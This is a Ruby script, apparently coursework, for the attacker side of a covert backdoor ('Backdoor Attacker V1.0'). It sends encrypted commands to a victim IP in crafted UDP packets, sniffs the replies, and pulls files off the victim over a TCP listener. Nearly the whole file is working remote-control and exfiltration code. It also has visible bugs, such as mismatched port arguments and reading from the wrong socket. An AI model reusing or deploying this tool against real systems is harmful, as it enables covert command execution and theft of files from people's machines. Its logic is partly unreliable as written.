#!/usr/bin/env ruby

# Ruby Libraries to load
require "socket"
#require "pcaplet"
require "packetfu"
require "./lib_trollop.rb"
require "./dispatch.rb"

include PacketFu

# Command line argument parsing
opts = Trollop::options do
	version "Backdoor Attacker V1.0 (c) 2012 Karl Castillo, James Brennan"
	banner <<-EOS
This is the attacker side of the Backdoor Terminal.

Usage:
	attacker [options]

where [options] are:		
	EOS
	
	opt :host, "Victim IP", :short => "-H", :type => :string, :default => "127.0.0.1" # string --host <s>, default 127.0.0.1
	opt :src, "Your IP", :short => "-S", :type => :string, :default => "127.0.0.1"
	opt :cport, "Victim Command Port", :short => "c", :default => 8000 # integer --cport <i>, default 8000
	opt :rport, "Response Port", :short => "r", :default => 8001 #integer --rpot <i>, default 8001
	opt :dev, "Victim File Transfer Port", :short => "d", :default => "lo" # integer --dev <s>, default lo
end

# Make sure that we are running as root
raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0

# Create UDP Socket for Commands
udp = UDPPacket.new
dis = Dispatch.new
cfg = Utils.whoami?(:iface => opts[:dev])

while 1 do
	print "> "
	cmd = gets.chomp
	# split up command
	cmds = cmd.split(' ')
	
	if cmds[0] == "quit" or cmd[0] == "q" then # Quit terminal
		abort("Quitting...")
	elsif cmds[0] == "help" or cmds[0] == "h" then # Show commands
		print "\nCommands:\n\n"
		print "\tquit/q: Quit the application\n"
		print "\thelp/h: Show list of commonly used commands\n"
		print "\tget [filename] <port>: Gets a specified file from the victim\n"
		print "\tls [directory]: Gets a listing of the files and directorie of a specific directory\n"
	elsif cmds[0] == "get" then # Get file
		hash = dis.encrypt(cmd)
		
		udp.udp_src = rand(0xfff - 1024) + 1024
		udp.udp_dst = opts[:cport]

		udp.ip_saddr = "127.0.0.1"
		udp.ip_daddr = opts[:host]

		udp.payload = hash
		udp.recalc
		udp.to_w(opts[:dev])
		
		# Create TCP Connection for file Transfer
		tcp = TCPServer.new('', cmds[3])
		
		# Wait for victim to connect
		print "Waiting for victim to connect to port: " + cmds[2] + "...\n"
		victim = tcp.accept
		print "Client connected...\n"
		name = cmds[1]

		# Open File for writing
		file = File.open(name, "wb")
		print"Receiving File: " + name + "\n"

		# TODO:
		# 	Test in lab
		while response = tcp.recv(1024)
			data = dis.decrypt(response)
			file.write(data)
		end
		
		# Close connection and file
		tcp.close
		file.close
		
		print "Data transfer complete!\n"
	else # Normal commands
		hash = dis.encrypt(cmd)

        udp.eth_saddr = cfg[:eth_saddr]

		udp.udp_src = rand(0xfff - 1024) + 1024
		udp.udp_dst = opts[:cport]

		udp.ip_saddr = cfg[:ip_saddr]
		udp.ip_daddr = opts[:host]

		udp.payload = hash
		
		udp.recalc
		udp.to_w(opts[:dev])
	
		filter = "udp and src host " + opts[:host] + " and dst port " + opts[:rport].to_s

		cap = Capture.new(:iface => opts[:dev], :start => true, :filter => filter)

		# Capture packets
		cap.stream.each do |pkt|
			packet = Packet.parse pkt
			print dis.decrypt packet.payload
			break
		end
	end
end
